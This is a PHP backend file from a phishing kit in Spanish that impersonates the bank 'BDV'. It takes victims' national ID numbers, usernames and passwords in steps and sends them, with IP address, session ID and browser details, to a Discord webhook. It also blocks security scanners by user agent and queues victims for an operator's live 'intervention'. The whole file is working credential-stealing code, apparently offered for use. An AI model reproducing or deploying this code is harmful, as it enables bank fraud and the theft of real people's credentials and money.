<?php
// user.php
error_reporting(0);
require 'discord_config.php'; 

// ----------------------------------------------------------------
// 🛡️ SEGURIDAD AÑADIDA (ANTI-BOT)
// ----------------------------------------------------------------
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (stripos($ua, 'python') !== false || stripos($ua, 'requests') !== false || stripos($ua, 'curl') !== false || empty($ua)) {
    http_response_code(403);
    exit("Acceso denegado.");
}
// ----------------------------------------------------------------

// CÓDIGO PARA OBTENER LA IP REAL (Mantenemos la lógica que ya tenías)
if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ip = trim(end($ip_list));
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// ----------------------------------------------------------------
// 🛡️ 1. BLOQUE DE SEGURIDAD HONEYPOT (Anti-Bot)
// Si un bot ha rellenado cualquiera de los campos trampa ocultos, detenemos el script.
$hp_username = isset($_POST['hp_username']) ? $_POST['hp_username'] : '';
$hp_password = isset($_POST['hp_password']) ? $_POST['hp_password'] : '';

if (!empty($hp_username) || !empty($hp_password)) {
    // Es un bot. Simplemente terminamos la ejecución de forma silenciosa.
    exit; 
}
// ----------------------------------------------------------------

// ----------------------------------------------------------------
// ⏱️ 2. BLOQUE DE SEGURIDAD: LIMITACIÓN DE TASA (RATE LIMITING)
// Configuración: Limita a 5 peticiones por IP en 60 segundos.
$rateLimitFile = 'data/rate_limit.json';
$maxRequests = 5;
$timeWindow = 60; 

// A. Cargar datos existentes
$rateData = file_exists($rateLimitFile) ? json_decode(file_get_contents($rateLimitFile), true) : [];
$currentTime = time();
$newRateData = [];

// B. Limpiar datos antiguos
foreach ($rateData as $ipKey => $timestamps) {
    // Filtrar los timestamps que aún son relevantes (dentro de los 60 segundos)
    $relevantTimestamps = array_filter($timestamps, function($t) use ($currentTime, $timeWindow) {
        return ($currentTime - $t) < $timeWindow;
    });

    if (!empty($relevantTimestamps)) {
        $newRateData[$ipKey] = array_values($relevantTimestamps);
    }
}

// C. Verificar el límite para la IP actual
$currentIPTimestamps = $newRateData[$ip] ?? [];

if (count($currentIPTimestamps) >= $maxRequests) {
    // Si la IP supera el límite, bloqueamos la solicitud.
    exit;
}

// D. Registrar la solicitud actual y guardar el archivo
$currentIPTimestamps[] = $currentTime;
$newRateData[$ip] = $currentIPTimestamps;
file_put_contents($rateLimitFile, json_encode($newRateData));

// ----------------------------------------------------------------


// 3. INICIO DE SESIÓN Y OBTENCIÓN DE DATOS
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Variables que pueden venir por POST (Identificación y Tipo Solicitud vendrán en CADA POST)
$identificacion = isset($_POST['identificacion']) ? trim($_POST['identificacion']) : ''; 
$tipoSolicitud = isset($_POST['tipo_solicitud']) ? trim($_POST['tipo_solicitud']) : ''; 
$nombre = isset($_POST['nombre']) ? trim($_POST['nombre']) : '';
$contra = isset($_POST['contra']) ? trim($_POST['contra']) : '';

$session_id = session_id(); 
$sessionsFile = 'data/sessions_status.json';


// Mapeo para traducir la clave interna (value) a un nombre legible
$readableType = [
    'Duplicar_Saldo' => 'Duplicar saldo',
    'TARJETA_CREDITO'  => 'solicita Tarjeta de Crédito',
    'Aumento_TDC'       => 'aumentar tdc',
    'comprar_dolares'   => 'compra divisas',
    'CREDIMUJER'       => 'Credimujer',
    'CREDIMOTO'        => 'Credimoto',
    'CREDICARRO'        => 'credicarro',
    'CREDICASA'        => 'credicasa'
];

// --- FUNCIÓN HELPER para obtener datos de sesión ---
function getSessionData($key, $default = 'N/A') {
    return isset($_SESSION[$key]) ? $_SESSION[$key] : $default;
}

// =======================================================
// LÓGICA DE ENVÍO POR PASOS
// =======================================================


// 4. PASO 2: PROCESAMIENTO Y ENVÍO DE USUARIO (Si $nombre está presente y $contra está vacía)
if (!empty($nombre) && empty($contra)) {

    // GUARDAR los datos del POST en la SESIÓN para usarlos en el Paso 3.
    if (!empty($identificacion) && !empty($tipoSolicitud)) {
        $_SESSION['identificacion'] = $identificacion;
        $_SESSION['tipoSolicitud'] = $tipoSolicitud;
    }
    $_SESSION['nombre'] = $nombre;

    // A) CONSTRUCCIÓN DEL EMBED y ENVÍO DE USUARIO A DISCORD
    $fields = [];

    // Aquí usamos los datos recién guardados (o leídos de POST)
    $identificacion_disp = $identificacion ?: getSessionData('identificacion');
    $tipoSolicitud_disp = $tipoSolicitud ?: getSessionData('tipoSolicitud');

    $fields[] = ['name' => '➡️ Identificación (Cédula)', 'value' => $identificacion_disp, 'inline' => true];
    $fields[] = ['name' => '➡️ Tipo de Solicitud', 'value' => $readableType[$tipoSolicitud_disp] ?? 'Desconocido', 'inline' => true];
    $fields[] = ['name' => '━━━━━━━━━━━━━━━━━━', 'value' => ' ', 'inline' => false];

    // Datos de Usuario
    $fields[] = ['name' => '👤 Usuario CAPTURADO', 'value' => "```{$nombre}```", 'inline' => true];
    $fields[] = ['name' => '🌐 IP', 'value' => "`{$ip}`", 'inline' => true]; 
    $fields[] = ['name' => '📱 Navegador', 'value' => "`{$userAgent}`", 'inline' => false];

    $embed = [
        'title' => 'BDV 🟢 - Usuario Capturado (Esperando Contraseña)',
        'color' => 65280, // Verde para Usuario
        'fields' => $fields,
        'timestamp' => date('c')
    ];

    sendToDiscordEmbed([$embed], 'Capturador de Usuario'); 

    // Retorna una respuesta para que el script de validacion.html pueda mostrar el formulario de Contraseña
    echo "Usuario enviado. Esperando Contraseña.";
    exit();
}


// 5. PASO 3: PROCESAMIENTO Y ENVÍO DE CONTRASEÑA (Al recibir $contra)
if (!empty($contra)) {

    // Obtener datos finales (priorizando POST, luego SESIÓN)
    $identificacion_final = $identificacion ?: getSessionData('identificacion');
    $nombre_final = $nombre ?: getSessionData('nombre');
    $tipoSolicitud_final = $tipoSolicitud ?: getSessionData('tipoSolicitud'); 

    // A) CONSTRUCCIÓN DEL EMBED y ENVÍO DE CONTRASEÑA A DISCORD
    $fields = [];

    // Incluir datos iniciales
    $fields[] = ['name' => '➡️ Identificación (Cédula)', 'value' => "**{$identificacion_final}**", 'inline' => true];
    $fields[] = ['name' => '➡️ Tipo de Solicitud', 'value' => $readableType[$tipoSolicitud_final] ?? 'Desconocido', 'inline' => true];
    $fields[] = ['name' => '━━━━━━━━━━━━━━━━━━', 'value' => ' ', 'inline' => false];

    // Credenciales capturadas
    $fields[] = ['name' => '👤 Usuario', 'value' => "```{$nombre_final}```", 'inline' => true];
    $fields[] = ['name' => '🔑 Contraseña CAPTURADA', 'value' => "```{$contra}```", 'inline' => true];
    $fields[] = ['name' => '━━━━━━━━━━━━━━━━━━', 'value' => ' ', 'inline' => false];

    $fields[] = ['name' => '🌐 IP', 'value' => "`{$ip}`", 'inline' => true]; 
    $fields[] = ['name' => '🔑 Session ID', 'value' => "`{$session_id}`", 'inline' => true];
    $fields[] = ['name' => '📱 Navegador', 'value' => "`{$userAgent}`", 'inline' => false];


    $embed = [
        'title' => 'BDV 🛑 - ¡INTERVENCIÓN REQUERIDA! (Credenciales Completas)',
        'color' => 16711680, // Rojo para Contraseña
        'fields' => $fields,
        'timestamp' => date('c')
    ];

    // Envía la Contraseña a Discord
    sendToDiscordEmbed([$embed], 'Capturador de Credenciales'); 

    // B) CAPTURAR LA SESIÓN DEL CLIENTE EN EL ARCHIVO JSON (Para el control del admin)
    $sessions = file_exists($sessionsFile) ? json_decode(file_get_contents($sessionsFile), true) : [];

    // Almacena el estado PENDING (usando los datos finales)
    $sessions[$session_id] = [
        'user' => $nombre_final,
        'identificacion' => $identificacion_final, 
        'ip' => $ip,
        'time' => time(),
        'status' => 'PENDING',
        'redirect' => 'validacion.html' 
    ];

    file_put_contents($sessionsFile, json_encode($sessions));

    // C) DESTRUCCIÓN DE LA SESIÓN DE PHP
    // Esto asegura que si el cliente regresa al inicio, no usará datos antiguos.
    session_unset();
    session_destroy();

    // D) REDIRECCIÓN FORZADA A LA PÁGINA DE ESPERA
    header('Location: cargando.php?session_id=' . $session_id);
    exit();
}


// 6. Si se accede directamente sin datos, redirige al inicio
if (empty($identificacion) && empty($nombre) && empty($contra)) {
    header('Location: index.php');
} else {
    // Si hay datos parciales, lo dejamos en validacion.html (aunque esto no debería pasar)
    header('Location: validacion.html'); 
}
exit();
?>